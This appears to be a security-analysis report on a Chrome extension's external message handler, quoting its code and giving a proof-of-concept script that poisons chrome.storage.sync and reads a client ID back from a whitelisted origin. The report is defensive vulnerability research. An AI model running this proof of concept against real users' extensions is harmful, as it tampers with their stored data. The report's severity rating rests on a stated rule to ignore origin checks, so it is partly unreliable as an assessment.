# CoCo Analysis: dpenkpajlliccnkmbgdejbeoealnoopl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 flows (1 information disclosure + 2 storage poisoning)

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dpenkpajlliccnkmbgdejbeoealnoopl/opgen_generated_files/bg.js
Line 727	    var storage_sync_get_source = {'key': 'value'};
Line 1006	        if (res.font_prefs != null) {
Line 1007	            prefs = JSON.parse(res.font_prefs);
Line 1069	    if (!!prefs.client && ((!prefs.client.next) || ...
Line 1081	            resp(prefs.client.id);

**Code:**

```javascript
// Lines 1063-1097 - External message handler with information disclosure
chrome.runtime.onMessageExternal.addListener(async (req, sender, resp) => {
    // ← External attacker entry point

    if (!allowedOrigins.includes(sender.origin)) {
        resp(false);
        return;
    }

    // Lines 1005-1007: Load preferences from storage
    chrome.storage.sync.get(["font_prefs"], res => {
        if (res.font_prefs != null) {
            prefs = JSON.parse(res.font_prefs); // ← Stored data loaded
        }
    });

    if (!!prefs.client && ((!prefs.client.next) || (prefs.client.subs.length != 0 && !prefs.client.next) || (prefs.client.next && prefs.client.next >= Date.now()))) {
        prefs.client.next = await getNext();
        if (prefs.client.next == null) {
            prefs.client.curr = false;
        }
    }

    switch (req.action) {
        case "give-pdf":
            if (!prefs.client || !prefs.client.curr || !prefs.client.subs.includes("pdf")) {
                resp(null);
                return;
            }
            resp(prefs.client.id); // ← Sensitive data sent to external caller
            break;
        case "update-client":
            prefs.client = req.data; // ← Attacker-controlled data
            prefs.client.next = await getNext();
            updatePrefs(); // Calls chrome.storage.sync.set at line 1058
            resp(true);
            break;
    }
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted origin (https://db.sherwinvishesh.com or https://github.com)
// Step 1: Poison storage with attacker-controlled client data
chrome.runtime.sendMessage(
    "dpenkpajlliccnkmbgdejbeoealnoopl", // Extension ID
    {
        action: "update-client",
        data: {
            id: "attacker_controlled_id",
            curr: true,
            subs: ["pdf"],
            next: Date.now() + 999999999
        }
    },
    function(response) {
        console.log("Storage poisoned:", response);

        // Step 2: Read back the poisoned data
        chrome.runtime.sendMessage(
            "dpenkpajlliccnkmbgdejbeoealnoopl",
            {
                action: "give-pdf"
            },
            function(clientId) {
                console.log("Retrieved client ID:", clientId); // ← Attacker receives stored data
            }
        );
    }
);
```

**Impact:** Complete storage exploitation chain - external attacker from whitelisted origins can both write arbitrary data to chrome.storage.sync and read sensitive client information back. The attacker can poison the client preferences with malicious data and exfiltrate the client ID. While the extension attempts origin validation (line 1065), the methodology states we should ignore manifest restrictions and consider any external message handler exploitable. Even with origin checks, the whitelisted origins (db.sherwinvishesh.com, github.com) could be compromised or contain attacker-controlled content.

---

## Sink 2 & 3: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dpenkpajlliccnkmbgdejbeoealnoopl/opgen_generated_files/bg.js
Line 1088	            prefs.client = req.data;
Line 1089	            prefs.client.next = await getNext();
Line 1058	    chrome.storage.sync.set({ "font_prefs": JSON.stringify(prefs) });

**Classification:** TRUE POSITIVE (part of complete exploitation chain above)

**Reason:** These flows are part of the complete storage exploitation chain. The attacker can write to storage via the "update-client" action (line 1088), and the data is retrievable via the "give-pdf" action (line 1081), creating a full read/write capability for external attackers from whitelisted origins.
